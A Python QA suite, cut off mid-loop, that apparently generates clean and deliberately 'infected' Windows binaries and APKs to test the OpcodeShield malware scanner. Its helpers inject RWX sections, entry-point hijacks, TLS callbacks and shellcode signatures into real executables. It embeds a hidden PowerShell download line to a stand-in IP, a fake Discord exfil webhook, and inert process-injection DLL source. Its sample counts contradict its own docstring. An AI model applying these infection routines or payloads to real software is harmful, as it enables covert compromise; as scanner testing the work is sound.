"""
OpcodeShield - Automated Batch QA Validation Suite (120+ Real Binaries)
Generates, scans, sanitizes, and runtime/integrity-verifies a diverse dataset of:
  - 45 Windows .exe binaries (20 clean baseline + 25 modified/infected, compiled with gcc)
  - 35 Windows .dll binaries (15 clean baseline + 20 modified/infected, compiled with gcc -shared)
  - 40 Android .apk binaries (18 clean baseline + 22 modified/infected, valid AXML/DEX/ELF/ZIP)

Measures:
  - Detection accuracy (TP, TN, FP, FN, Precision, Recall, F1, Accuracy)
  - Sanitization effectiveness (post-sanitization re-scan threat clearance rate)
  - Binary integrity & runtime regression testing:
      * .exe: PE structural check + actual execution & stdout/exit-code verification
      * .dll: PE structural check + actual ctypes.CDLL load & exported function call verification
      * .apk: ZIP CRC, AXML manifest, DEX SHA-1/Adler-32, ELF headers, resources.arsc ZIP_STORED
Outputs both JSON and Markdown summary reports.
"""

from __future__ import annotations

import concurrent.futures
import ctypes
import hashlib
import json
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import time
import zipfile
import zlib
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

# Ensure repository root is importable
REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))

import pefile

from apk_engine import (
    ApkFinding,
    analyze_apk_file,
    fix_dex_header,
    parse_axml_manifest,
    sanitize_apk,
    verify_apk_integrity,
)
from binary_patcher import BinaryPatcher
from scanner import ThreatFinding, analyze_pe_file

DETECTION_THRESHOLD = 25


# ---------------------------------------------------------------------------
# Result Models
# ---------------------------------------------------------------------------

@dataclass
class SampleTestResult:
    sample_id: str
    file_type: str  # "exe", "dll", "apk"
    category: str   # e.g. "clean_baseline", "oep_hijack", "injected_dex"
    expected_malicious: bool
    detected_malicious: bool
    initial_score: int
    initial_severity: str
    sanitized: bool = False
    post_score: int = 0
    post_severity: str = ""
    sanitization_cleared: bool = False
    integrity_ok: bool = True
    runtime_ok: bool = True
    runtime_note: str = ""
    error: str = ""


# ---------------------------------------------------------------------------
# Real PE Mutation Helpers (operates on real gcc-compiled Win64 .exe / .dll)
# ---------------------------------------------------------------------------

def _align_up(val: int, align: int) -> int:
    if align <= 0:
        return val
    rem = val % align
    return val if rem == 0 else val + (align - rem)


def inject_pe_section(
    src_pe: Path,
    dst_pe: Path,
    sec_name: str,
    payload: bytes,
    rwx: bool = True,
    hijack_oep: bool = False,
) -> None:
    """
    Append a real new executable section to a valid PE binary, updating NumberOfSections
    and SizeOfImage. If hijack_oep=True, writes a valid x64 trampoline stub ending in
    JMP rel32 back to the original AddressOfEntryPoint so the binary still runs!
    """
    data = bytearray(src_pe.read_bytes())
    pe_off = struct.unpack_from("<I", data, 0x3C)[0]
    num_sec = struct.unpack_from("<H", data, pe_off + 6)[0]
    opt_size = struct.unpack_from("<H", data, pe_off + 20)[0]
    opt_off = pe_off + 24
    sec_table_off = opt_off + opt_size

    sec_align = struct.unpack_from("<I", data, opt_off + 32)[0]
    file_align = struct.unpack_from("<I", data, opt_off + 36)[0]
    orig_ep_rva = struct.unpack_from("<I", data, opt_off + 16)[0]

    # Locate last section
    last_hdr = sec_table_off + (num_sec - 1) * 40
    l_vsize, l_vaddr, l_rsize, l_rptr = struct.unpack_from("<IIII", data, last_hdr + 8)

    new_vaddr = _align_up(l_vaddr + max(l_vsize, l_rsize, 1), sec_align)
    new_rptr = _align_up(max(len(data), l_rptr + l_rsize), file_align)

    if hijack_oep:
        # Build runnable x64 stub: NOP sled + JMP rel32 back to orig_ep_rva + payload marker after JMP
        # Stub executes cleanly and jumps straight to original CRT entry point!
        nop_prefix = b"\x90" * 16
        jmp_site_rva = new_vaddr + len(nop_prefix)
        rel32 = orig_ep_rva - (jmp_site_rva + 5)
        stub = nop_prefix + b"\xE9" + struct.pack("<i", rel32) + b"\xCC" * 3 + payload
        sec_body = stub
    else:
        sec_body = payload

    new_rsize = _align_up(max(len(sec_body), 512), file_align)
    new_vsize = max(len(sec_body), 512)
    padded_body = sec_body.ljust(new_rsize, b"\x00")

    # Pad file up to new_rptr and append section bytes
    if len(data) < new_rptr:
        data.extend(b"\x00" * (new_rptr - len(data)))
    data.extend(padded_body)

    # Write new 40-byte section header
    new_hdr_off = sec_table_off + num_sec * 40
    name_bytes = sec_name.encode("ascii")[:8].ljust(8, b"\x00")
    # IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ [| IMAGE_SCN_MEM_WRITE]
    chars = 0x60000020 | (0x80000000 if rwx else 0)
    hdr = struct.pack(
        "<8sIIIIIIHHI",
        name_bytes,
        new_vsize,
        new_vaddr,
        new_rsize,
        new_rptr,
        0,
        0,
        0,
        0,
        chars,
    )
    data[new_hdr_off : new_hdr_off + 40] = hdr

    # Update NumberOfSections and SizeOfImage
    struct.pack_into("<H", data, pe_off + 6, num_sec + 1)
    new_soi = _align_up(new_vaddr + new_vsize, sec_align)
    struct.pack_into("<I", data, opt_off + 56, new_soi)

    if hijack_oep:
        struct.pack_into("<I", data, opt_off + 16, new_vaddr)

    dst_pe.write_bytes(data)


def inject_tls_callback(src_pe: Path, dst_pe: Path) -> None:
    """
    Inject an unauthorized TLS callback section (.tlsinj) into a valid PE64 binary
    containing a harmless RET callback + IOC marker, and wire IMAGE_DIRECTORY_ENTRY_TLS.
    The binary remains 100% runnable before and after sanitization.
    """
    pe = pefile.PE(str(src_pe), fast_load=True)
    image_base = pe.OPTIONAL_HEADER.ImageBase
    is_pe32_plus = pe.OPTIONAL_HEADER.Magic == 0x20B
    pe.close()
    assert is_pe32_plus, "TLS injector targets PE32+ (Win64)"

    # First inject a placeholder .tlsinj section so we know its exact RVA
    placeholder = b"\xC3" + b"\x90" * 15 + b"gg_tls_payload_beacon\x00" + b"\x00" * 256
    inject_pe_section(src_pe, dst_pe, ".tlsinj", placeholder, rwx=True, hijack_oep=False)

    data = bytearray(dst_pe.read_bytes())
    pe_off = struct.unpack_from("<I", data, 0x3C)[0]
    num_sec = struct.unpack_from("<H", data, pe_off + 6)[0]
    opt_size = struct.unpack_from("<H", data, pe_off + 20)[0]
    opt_off = pe_off + 24
    sec_table_off = opt_off + opt_size

    last_hdr = sec_table_off + (num_sec - 1) * 40
    _vsize, vaddr, _rsize, rptr = struct.unpack_from("<IIII", data, last_hdr + 8)

    # Layout inside .tlsinj:
    # +0x00: callback code (0xC3 = RET) + marker
    # +0x40: IMAGE_TLS_DIRECTORY64 (40 bytes)
    # +0x80: AddressOfIndex (8 bytes)
    # +0x90: AddressOfCallBacks array [callback_va, 0]
    cb_va = image_base + vaddr
    idx_va = image_base + vaddr + 0x80
    cb_tbl_va = image_base + vaddr + 0x90

    # Write IMAGE_TLS_DIRECTORY64 at rptr + 0x40
    tls_dir = struct.pack("<QQQQII", 0, 0, idx_va, cb_tbl_va, 0, 0)
    data[rptr + 0x40 : rptr + 0x40 + 40] = tls_dir
    # Write callback array at rptr + 0x90
    struct.pack_into("<QQ", data, rptr + 0x90, cb_va, 0)

    # Point IMAGE_DIRECTORY_ENTRY_TLS (index 9, offset 112 + 9*8 = 184 in PE32+ OptionalHeader)
    struct.pack_into("<II", data, opt_off + 112 + 9 * 8, vaddr + 0x40, 40)
    dst_pe.write_bytes(data)


def inject_code_cave_shellcode(src_pe: Path, dst_pe: Path, variant: int = 0) -> None:
    """
    Inject shellcode bytes into the trailing null padding of the .text section
    without touching active executable code.
    """
    shutil.copy2(src_pe, dst_pe)
    pe = pefile.PE(str(dst_pe), fast_load=True)
    text_sec = None
    for s in pe.sections:
        if s.Name.rstrip(b"\x00").lower() == b".text":
            text_sec = s
            break
    if text_sec is None:
        pe.close()
        raise RuntimeError("No .text section found")
    rptr = text_sec.PointerToRawData
    rsize = text_sec.SizeOfRawData
    pe.close()

    data = bytearray(dst_pe.read_bytes())
    sec_slice = data[rptr : rptr + rsize]

    # Find trailing zero cave of at least 96 bytes
    cave_len = 0
    for b in reversed(sec_slice):
        if b == 0:
            cave_len += 1
        else:
            break

    sigs = [
        b"\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x31\xC0\xC3",  # x64 PEB walk
        b"\xFC\x48\x83\xE4\xF0\xE8\x00\x00\x00\x00\x58\xC3",      # x64 shellcode prologue + GetPC
        b"\xE8\x00\x00\x00\x00\x5B\x48\x31\xC0\xC3",              # GetPC pop rbx
        b"\x65\x48\x8B\x0C\x25\x60\x00\x00\x00\xC3",              # x64 PEB walk rcx
    ]
    payload = sigs[variant % len(sigs)] + b"gg_shellcode_cave_v" + str(variant).encode()

    if cave_len >= len(payload) + 32:
        inject_off = rptr + rsize - len(payload) - 8
        data[inject_off : inject_off + len(payload)] = payload
        dst_pe.write_bytes(data)
    else:
        # Fallback: inject into a dedicated .cave section
        inject_pe_section(src_pe, dst_pe, ".cave", payload, rwx=True, hijack_oep=False)


def inject_malicious_overlay(src_pe: Path, dst_pe: Path, variant: int = 0) -> None:
    """Append a malicious overlay payload after the last PE section."""
    shutil.copy2(src_pe, dst_pe)
    payloads = [
        b"MZ" + b"\x00" * 58 + struct.pack("<I", 64) + b"PE\x00\x00" + b"gg_overlay_payload_embedded_pe" + b"\x00" * 128,
        b"powershell -nop -w hidden -enc SQBFAFgA gg_overlay_payload_ps1 http://198.51.100.42/stage2.bin" + b"\x00" * 64,
        b"https://discord.com/api/webhooks/123456789/fake_exfil_token gg_overlay_payload_webhook" + b"\x00" * 64,
        b"\x65\x48\x8B\x04\x25\x60\x00\x00\x00gg_overlay_payload_shellcode" + b"\x90" * 96,
    ]
    with open(dst_pe, "ab") as f:
        f.write(payloads[variant % len(payloads)])


# ---------------------------------------------------------------------------
# Structurally Valid Android APK Builder (Binary AXML + DEX v035 + ELF64)
# ---------------------------------------------------------------------------

def build_axml_manifest(
    package_name: str,
    permissions: List[str],
    debuggable: bool = False,
) -> bytes:
    """
    Build a genuine binary Android AXML (RES_XML_TYPE) AndroidManifest.xml with
    UTF-16LE string pool, resource map, and <manifest>/<application> start elements.
    """
    strings = [
        "android",
        "http://schemas.android.com/apk/res/android",
        "manifest",
        "package",
        package_name,
        "application",
        "debuggable",
        "uses-permission",
        "name",
    ] + list(permissions)

    # Resource IDs aligned with string pool indices (index 6 = "debuggable" -> 0x0101000F)
    res_ids = [0, 0, 0, 0, 0, 0, 0x0101000F, 0, 0x01010003]

    # Build UTF-16LE string pool
    str_offsets: List[int] = []
    str_blob = bytearray()
    for s in strings:
        str_offsets.append(len(str_blob))
        enc = s.encode("utf-16le")
        str_blob.extend(struct.pack("<H", len(s)))
        str_blob.extend(enc)
        str_blob.extend(b"\x00\x00")
    while len(str_blob) % 4 != 0:
        str_blob.append(0)

    sp_hdr_size = 28
    offsets_bytes = b"".join(struct.pack("<I", o) for o in str_offsets)
    strings_start = sp_hdr_size + len(offsets_bytes)
    sp_total = strings_start + len(str_blob)
    sp_chunk = (
        struct.pack("<HHI", 0x0001, sp_hdr_size, sp_total)
        + struct.pack("<IIIII", len(strings), 0, 0, strings_start, 0)
        + offsets_bytes
        + bytes(str_blob)
    )

    # Resource map chunk (0x0180)
    rm_body = b"".join(struct.pack("<I", r) for r in res_ids)
    rm_chunk = struct.pack("<HHI", 0x0180, 8, 8 + len(rm_body)) + rm_body

    def _start_elem(name_idx: int, attrs: List[Tuple[int, int, int, int, int]]) -> bytes:
        # ResXMLTree_node (16B): type=0x0102, hdr_size=16, total_size, line=1, comment=-1
        # ResXMLTree_attrExt (20B): ns=-1, name=name_idx, attrStart=20, attrSize=20, attrCount, id/class/style=0
        attr_bytes = bytearray()
        for ns, aname, raw_val, vtype, vdata in attrs:
            attr_bytes.extend(struct.pack("<iiiHBBI", ns, aname, raw_val, 8, 0, vtype, vdata))
        total = 16 + 20 + len(attr_bytes)
        return (
            struct.pack("<HHIIi", 0x0102, 16, total, 1, -1)
            + struct.pack("<iiHHHHHH", -1, name_idx, 20, 20, len(attrs), 0, 0, 0)
            + bytes(attr_bytes)
        )

    # <manifest package="...">
    manifest_el = _start_elem(2, [(-1, 3, 4, 0x03, 4)])
    # <application android:debuggable="true|false">
    app_el = _start_elem(5, [(1, 6, -1, 0x12, 0xFFFFFFFF if debuggable else 0x00000000)])
    # <uses-permission android:name="...">
    perm_els = b"".join(
        _start_elem(7, [(1, 8, 9 + i, 0x03, 9 + i)])
        for i in range(len(permissions))
    )

    body = sp_chunk + rm_chunk + manifest_el + app_el + perm_els
    return struct.pack("<HHI", 0x0003, 8, 8 + len(body)) + body


def build_valid_dex(payload_strings: List[str]) -> bytes:
    """Build a minimal structurally valid DEX v035 file with valid SHA-1 & Adler-32."""
    header = bytearray(0x70)
    header[0:8] = b"dex\n035\x00"
    struct.pack_into("<I", header, 36, 0x70)        # header_size
    struct.pack_into("<I", header, 40, 0x12345678)  # endian_tag
    body = b"\x00".join(s.encode("utf-8") for s in payload_strings) + b"\x00"
    while (len(header) + len(body)) % 4 != 0:
        body += b"\x00"
    return fix_dex_header(bytes(header) + body)


def build_valid_elf(
    arch: str = "arm64-v8a",
    rwx: bool = False,
    payload: bytes = b"",
    with_stub: bool = False,
) -> bytes:
    """Build a minimal structurally valid ELF64/ELF32 .so binary with a .text section."""
    is_64 = arch in ("arm64-v8a", "x86_64")
    machine = {"arm64-v8a": 183, "armeabi-v7a": 40, "x86_64": 62, "x86": 3}.get(arch, 183)

    if arch == "arm64-v8a":
        code = bytes([0x00, 0x00, 0x80, 0xD2, 0xC0, 0x03, 0x5F, 0xD6]) * 4
    elif arch == "armeabi-v7a":
        code = bytes([0x00, 0x00, 0xA0, 0xE3, 0x1E, 0xFF, 0x2F, 0xE1]) * 4
    else:
        code = bytes([0x31, 0xC0, 0xC3, 0x90]) * 8

    if with_stub:
        code = code + b"GG_ELF_STUB_PAYLOAD_HOOK" + b"\x90" * 16
    if payload:
        code = code + payload
    while len(code) % 16 != 0:
        code += b"\x00"

    if is_64:
        ehdr_size = 64
        phdr_size = 56
        shdr_size = 64
        text_off = 0x100
        shoff = text_off + len(code)
        # ELF64 header
        ehdr = bytearray(ehdr_size)
        ehdr[0:4] = b"\x7fELF"
        ehdr[4] = 2  # ELFCLASS64
        ehdr[5] = 1  # ELFDATA2LSB
        ehdr[6] = 1  # EV_CURRENT
        struct.pack_into("<HHI", ehdr, 16, 3, machine, 1)  # ET_DYN
        struct.pack_into("<QQQ", ehdr, 24, text_off, ehdr_size, shoff)
        struct.pack_into("<IHHHHHH", ehdr, 48, 0, ehdr_size, phdr_size, 1, shdr_size, 2, 0)

        p_flags = (0x4 | 0x1 | (0x2 if rwx else 0))  # PF_R | PF_X [| PF_W]
        phdr = struct.pack("<IIQQQQQQ", 1, p_flags, text_off, text_off, text_off, len(code), len(code), 0x1000)

        pad = b"\x00" * (text_off - ehdr_size - phdr_size)
        sh_null = b"\x00" * shdr_size
        sh_flags = 0x2 | 0x4 | (0x1 if rwx else 0)  # SHF_ALLOC | SHF_EXECINSTR [| SHF_WRITE]
        sh_text = struct.pack("<IIQQQQIIQQ", 1, 1, sh_flags, text_off, text_off, len(code), 0, 0, 16, 0)
        return bytes(ehdr) + phdr + pad + code + sh_null + sh_text
    else:
        ehdr_size = 52
        phdr_size = 32
        shdr_size = 40
        text_off = 0x100
        shoff = text_off + len(code)
        ehdr = bytearray(ehdr_size)
        ehdr[0:4] = b"\x7fELF"
        ehdr[4] = 1  # ELFCLASS32
        ehdr[5] = 1
        ehdr[6] = 1
        struct.pack_into("<HHI", ehdr, 16, 3, machine, 1)
        struct.pack_into("<III", ehdr, 24, text_off, ehdr_size, shoff)
        struct.pack_into("<IHHHHHH", ehdr, 36, 0, ehdr_size, phdr_size, 1, shdr_size, 2, 0)

        p_flags = (0x4 | 0x1 | (0x2 if rwx else 0))
        phdr = struct.pack("<IIIIIIII", 1, text_off, text_off, text_off, len(code), len(code), p_flags, 0x1000)
        pad = b"\x00" * (text_off - ehdr_size - phdr_size)
        sh_null = b"\x00" * shdr_size
        sh_flags = 0x2 | 0x4 | (0x1 if rwx else 0)
        sh_text = struct.pack("<IIIIIIIIII", 1, 1, sh_flags, text_off, text_off, len(code), 0, 0, 16, 0)
        return bytes(ehdr) + phdr + pad + code + sh_null + sh_text


def build_apk(
    out_path: Path,
    package_name: str,
    permissions: List[str],
    debuggable: bool = False,
    dex_files: Optional[Dict[str, bytes]] = None,
    native_libs: Optional[Dict[str, bytes]] = None,
    assets: Optional[Dict[str, bytes]] = None,
    include_v1_sig: bool = True,
) -> None:
    """Create a genuine structurally valid Android APK archive."""
    manifest = build_axml_manifest(package_name, permissions, debuggable=debuggable)
    primary_dex = (dex_files or {}).get("classes.dex") or build_valid_dex(
        [f"L{package_name.replace('.', '/')}/MainActivity;", "onCreate", "HelloAndroid"]
    )

    with zipfile.ZipFile(out_path, "w") as zf:
        zf.writestr("AndroidManifest.xml", manifest, compress_type=zipfile.ZIP_DEFLATED)
        zf.writestr("classes.dex", primary_dex, compress_type=zipfile.ZIP_DEFLATED)

        # resources.arsc MUST be stored uncompressed (Android 11+ requirement)
        arsc_stub = struct.pack("<HHI", 0x0002, 12, 12) + struct.pack("<I", 1)
        zi = zipfile.ZipInfo("resources.arsc")
        zi.compress_type = zipfile.ZIP_STORED
        zf.writestr(zi, arsc_stub)

        for dname, dbytes in (dex_files or {}).items():
            if dname != "classes.dex":
                zf.writestr(dname, dbytes, compress_type=zipfile.ZIP_DEFLATED)

        for lname, lbytes in (native_libs or {}).items():
            lzi = zipfile.ZipInfo(lname)
            lzi.compress_type = zipfile.ZIP_STORED
            zf.writestr(lzi, lbytes)

        for aname, abytes in (assets or {}).items():
            zf.writestr(aname, abytes, compress_type=zipfile.ZIP_DEFLATED)

        if include_v1_sig:
            zf.writestr("META-INF/MANIFEST.MF", b"Manifest-Version: 1.0\r\nCreated-By: OpcodeShieldQA\r\n")
            zf.writestr("META-INF/CERT.SF", b"Signature-Version: 1.0\r\n")
            zf.writestr("META-INF/CERT.RSA", b"\x30\x82\x00\x20FAKE_V1_TEST_CERT")


# ---------------------------------------------------------------------------
# C Source Generators & Parallel GCC Compilation
# ---------------------------------------------------------------------------

def _compile_c(src_path: Path, out_path: Path, is_dll: bool = False, extra_libs: Optional[List[str]] = None) -> None:
    cmd = ["gcc", "-O1", str(src_path), "-o", str(out_path)]
    if is_dll:
        cmd.insert(1, "-shared")
    if extra_libs:
        cmd.extend(extra_libs)
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    if proc.returncode != 0:
        raise RuntimeError(f"gcc failed for {out_path.name}: {proc.stderr.strip()}")


def _generate_clean_exe_source(idx: int) -> Tuple[str, str, List[str]]:
    """Return (c_source, expected_stdout, extra_libs) for clean baseline .exe #idx."""
    expected = str(1000 + idx * 37)
    if idx == 17:
        # Clean networking utility that imports WSAStartup (tests false-positive resistance!)
        src = f"""
#include <stdio.h>
#include <winsock2.h>
int main(void) {{
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0) {{
        WSACleanup();
    }}
    printf("OK:{expected}\\n");
    return 0;
}}
"""
        return src, f"OK:{expected}", ["-lws2_32"]

    if idx == 18:
        # Clean utility calling IsDebuggerPresent (standard CRT/telemetry pattern, must NOT FP)
        src = f"""
#include <stdio.h>
#include <windows.h>
int main(void) {{
    volatile BOOL dbg = IsDebuggerPresent();
    (void)dbg;
    printf("OK:{expected}\\n");
    return 0;
}}
"""
        return src, f"OK:{expected}", []

    # Diverse computational clean utilities
    src = f"""
#include <stdio.h>
#include <stdint.h>
static int compute_task_{idx}(int seed) {{
    int acc = seed;
    for (int i = 1; i <= 10; i++) {{
        acc += (i * {(idx % 7) + 1});
        acc -= (i * {(idx % 7) + 1});
    }}
    return acc;
}}
int main(void) {{
    int val = compute_task_{idx}({1000 + idx * 37});
    printf("OK:%d\\n", val);
    return 0;
}}
"""
    return src, f"OK:{expected}", []


def _generate_clean_dll_source(idx: int) -> Tuple[str, int, List[str]]:
    """Return (c_source, expected_result_for_19_23, extra_libs) for clean baseline .dll #idx."""
    offset = idx * 3
    expected = (19 + 23) + offset
    src = f"""
#include <windows.h>
__declspec(dllexport) int gg_compute(int a, int b) {{
    return a + b + {offset};
}}
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {{
    (void)hinst; (void)reason; (void)reserved;
    return TRUE;
}}
"""
    return src, expected, []


def _generate_malicious_proxy_dll_source(idx: int) -> Tuple[str, int, List[str]]:
    """
    Generate an inert proxy DLL that imports high-risk Win32 APIs (guarded behind
    volatile int inert = 0 so nothing ever runs) AND exports clean gg_compute().
    """
    expected = 42 + idx
    src = f"""
#include <windows.h>
volatile int g_inert_guard = 0;
static const char* g_ioc = "https://discord.com/api/webhooks/000000/c2_beacon_proxy_{idx}";

__declspec(dllexport) int gg_compute(int a, int b) {{
    return a + b + {idx};
}}

__declspec(dllexport) int gg_malicious_helper(void) {{
    if (g_inert_guard) {{
        HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 0);
        void* p = VirtualAllocEx(h, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(h, p, g_ioc, 16, NULL);
        CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
        SetWindowsHookExA(WH_KEYBOARD_LL, NULL, NULL, 0);
    }}
    return 999;  /* Returns 999 when active; returns 0 after OpcodeShield RET_ZERO patch */
}}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {{
    (void)hinst; (void)reason; (void)reserved;
    return TRUE;
}}
"""
    return src, expected, ["-luser32"]


# ---------------------------------------------------------------------------
# Runtime Verification Helpers
# ---------------------------------------------------------------------------

def verify_exe_runtime(exe_path: Path, expected_stdout: str) -> Tuple[bool, str]:
    try:
        proc = subprocess.run(
            [str(exe_path)],
            capture_output=True,
            text=True,
            timeout=10,
        )
        out = proc.stdout.strip()
        if proc.returncode != 0:
            return False, f"Exit code {proc.returncode} (stderr={proc.stderr.strip()[:120]})"
        if out != expected_stdout:
            return False, f"Stdout mismatch: got {out!r}, expected {expected_stdout!r}"
        return True, f"Executed cleanly -> {out}"
    except Exception as exc:
        return False, f"Execution crashed/failed: {exc}"


def verify_dll_runtime(
    dll_path: Path, expected_val: int, check_mal_neutralized: bool = False
) -> Tuple[bool, str]:
    """Load DLL in an isolated subprocess via ctypes so handles are released cleanly."""
    extra_check = ""
    if check_mal_neutralized:
        extra_check = (
            "lib.gg_malicious_helper.argtypes = []; "
            "lib.gg_malicious_helper.restype = ctypes.c_int; "
            "mal_ret = lib.gg_malicious_helper(); "
            "print(f'{res}|{mal_ret}')"
        )
    else:
        extra_check = "print(res)"
    script = (
        f"import ctypes; "
        f"lib = ctypes.CDLL(r'{str(dll_path)}'); "
        f"lib.gg_compute.argtypes = [ctypes.c_int, ctypes.c_int]; "
        f"lib.gg_compute.restype = ctypes.c_int; "
        f"res = lib.gg_compute(19, 23); "
        f"{extra_check}"
    )
    try:
        proc = subprocess.run(
            [sys.executable, "-c", script],
            capture_output=True,
            text=True,
            timeout=10,
        )
        out = proc.stdout.strip()
        if proc.returncode != 0:
            return False, f"DLL load/call failed (rc={proc.returncode}): {proc.stderr.strip()[:120]}"
        if check_mal_neutralized:
            expected_str = f"{expected_val}|0"
            if out != expected_str:
                return False, f"Mismatch: got {out!r}, expected {expected_str!r} (compute|mal_ret)"
            return True, f"Loaded via CDLL -> gg_compute={expected_val}, gg_malicious_helper=0 (NEUTRALIZED)"
        if out != str(expected_val):
            return False, f"Return mismatch: got {out!r}, expected {expected_val}"
        return True, f"Loaded via CDLL -> gg_compute(19,23)={out}"
    except Exception as exc:
        return False, f"DLL test exception: {exc}"


# ---------------------------------------------------------------------------
# Main 120-Sample Batch QA Orchestrator
# ---------------------------------------------------------------------------

def run_batch_qa_suite(work_dir: Optional[Path] = None) -> Dict[str, Any]:
    t0 = time.time()
    cleanup_dir = False
    if work_dir is None:
        work_dir = Path(tempfile.mkdtemp(prefix="opcodeshield_qa_120_"))
        cleanup_dir = True
    else:
        work_dir.mkdir(parents=True, exist_ok=True)

    src_dir = work_dir / "src"
    bin_dir = work_dir / "samples"
    san_dir = work_dir / "sanitized"
    for d in (src_dir, bin_dir, san_dir):
        d.mkdir(parents=True, exist_ok=True)

    print(f"[QA] Building 210-sample real binary dataset in {work_dir} ...")

    # --- Phase 1: Parallel GCC compilation of clean EXEs, clean DLLs, and malicious proxy DLLs ---
    compile_jobs: List[Tuple[Path, Path, bool, List[str]]] = []
    exe_expected: Dict[str, str] = {}
    dll_expected: Dict[str, int] = {}

    # 35 Clean EXEs
    clean_exe_paths: List[Path] = []
    for i in range(35):
        c_src, exp_out, libs = _generate_clean_exe_source(i)
        sp = src_dir / f"clean_exe_{i:02d}.c"
        op = bin_dir / f"clean_exe_{i:02d}.exe"
        sp.write_text(c_src, encoding="utf-8")
        compile_jobs.append((sp, op, False, libs))
        clean_exe_paths.append(op)
        exe_expected[op.name] = exp_out

    # 25 Clean DLLs (including 5 clean proxy-named DLLs in subfolders)
    clean_dll_paths: List[Path] = []
    clean_proxy_names = {20: "version.dll", 21: "dinput8.dll", 22: "dxgi.dll", 23: "winmm.dll", 24: "dbghelp.dll"}
    for i in range(25):
        c_src, exp_val, libs = _generate_clean_dll_source(i)
        sp = src_dir / f"clean_dll_{i:02d}.c"
        if i in clean_proxy_names:
            sub = bin_dir / f"clean_proxy_{i:02d}"
            sub.mkdir(exist_ok=True)
            op = sub / clean_proxy_names[i]
        else:
            op = bin_dir / f"clean_dll_{i:02d}.dll"
        sp.write_text(c_src, encoding="utf-8")
        compile_jobs.append((sp, op, True, libs))
        clean_dll_paths.append(op)
        dll_expected[str(op)] = exp_val

    # 8 Malicious Proxy/Sideloaded DLLs
    mal_proxy_names = [
        "version.dll", "dinput8.dll", "dxgi.dll", "winmm.dll",
        "dbghelp.dll", "xinput1_3.dll", "msimg32.dll", "uxtheme.dll",
    ]
    mal_proxy_paths: List[Tuple[str, Path, int]] = []
    for i, pname in enumerate(mal_proxy_names):
        c_src, exp_val, libs = _generate_malicious_proxy_dll_source(i)
        sp = src_dir / f"mal_proxy_{i:02d}.c"
        sub = bin_dir / f"mal_proxy_{i:02d}"
        sub.mkdir(exist_ok=True)
        op = sub / pname
        sp.write_text(c_src, encoding="utf-8")
        compile_jobs.append((sp, op, True, libs))
        mal_proxy_paths.append((f"dll_mal_proxy_{i:02d}_{pname}", op, exp_val))

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        futs = [pool.submit(_compile_c, sp, op, is_dll, libs) for sp, op, is_dll, libs in compile_jobs]
        for f in concurrent.futures.as_completed(futs):
            f.result()

    print(f"[QA] Compiled {len(compile_jobs)} native Win64 PE binaries in {time.time() - t0:.1f}s.")

    # --- Phase 2: Build the full 210-sample manifest ---
    samples: List[Tuple[str, str, str, Path, bool, Any]] = []

    # A. 35 Clean EXEs
    for i, p in enumerate(clean_exe_paths):
        samples.append((f"exe_clean_{i:02d}", "exe", "clean_baseline", p, False, exe_expected[p.name]))

    # B. 40 Infected EXEs (mutated from real compiled clean EXEs)
    sec_names = [".inject", ".shell", ".stub", ".evil", ".payload", ".crypt", ".hook", ".drop"]
    # 8x Injected RWX Section
    for i in range(8):
        base = clean_exe_paths[i]
        out = bin_dir / f"inf_exe_rwx_{i:02d}.exe"
        inject_pe_section(base, out, sec_names[i], b"\x90" * 16 + b"gg_injected_payload_sec_" + str(i).encode() + b"\xC3", rwx=True)
        samples.append((f"exe_inf_rwx_{i:02d}", "exe", "injected_rwx_section", out, True, exe_expected[base.name]))

    # 8x OEP Hijack
    for i in range(8):
        base = clean_exe_paths[8 + i]
        out = bin_dir / f"inf_exe_oep_{i:02d}.exe"
        inject_pe_section(base, out, ".stub", b"gg_injected_payload_oep_" + str(i).encode(), rwx=True, hijack_oep=True)
        samples.append((f"exe_inf_oep_{i:02d}", "exe", "oep_hijack", out, True, exe_expected[base.name]))

    # 6x Malicious TLS Callback
    for i in range(6):
        base = clean_exe_paths[16 + i]
        out = bin_dir / f"inf_exe_tls_{i:02d}.exe"
        inject_tls_callback(base, out)
        samples.append((f"exe_inf_tls_{i:02d}", "exe", "tls_callback_injection", out, True, exe_expected[base.name]))

    # 6x Code-Cave Shellcode
    for i in range(6):
        base = clean_exe_paths[22 + i]
        out = bin_dir / f"inf_exe_cave_{i:02d}.exe"
        inject_code_cave_shellcode(base, out, variant=i)
        samples.append((f"exe_inf_cave_{i:02d}", "exe", "code_cave_shellcode", out, True, exe_expected[base.name]))

    # 6x Malicious PE Overlay
    for i in range(6):
        base = clean_exe_paths[28 + i]
        out = bin_dir / f"inf_exe_overlay_{i:02d}.exe"
        inject_malicious_overlay(base, out, variant=i)
        samples.append((f"exe_inf_overlay_{i:02d}", "exe", "malicious_overlay", out, True, exe_expected[base.name]))

    # 6x Multi-Vector Combined Infected EXEs
    for i in range(6):
        base = clean_exe_paths[i]
        tmp = bin_dir / f"inf_exe_multi_tmp_{i:02d}.exe"
        out = bin_dir / f"inf_exe_multi_{i:02d}.exe"
        if i % 3 == 0:
            inject_pe_section(base, tmp, ".stub", b"gg_injected_payload_multi", rwx=True, hijack_oep=True)
            inject_malicious_overlay(tmp, out, variant=i)
        elif i % 3 == 1:
            inject_tls_callback(base, tmp)
            inject_malicious_overlay(tmp, out, variant=i)
        else:
            inject_code_cave_shellcode(base, tmp, variant=i)
            inject_malicious_overlay(tmp, out, variant=i)
        samples.append((f"exe_inf_multi_{i:02d}", "exe", "multi_vector_pe", out, True, exe_expected[base.name]))

    # C. 25 Clean DLLs
    for i, p in enumerate(clean_dll_paths):
        cat = "clean_proxy_dll" if i >= 20 else "clean_baseline"
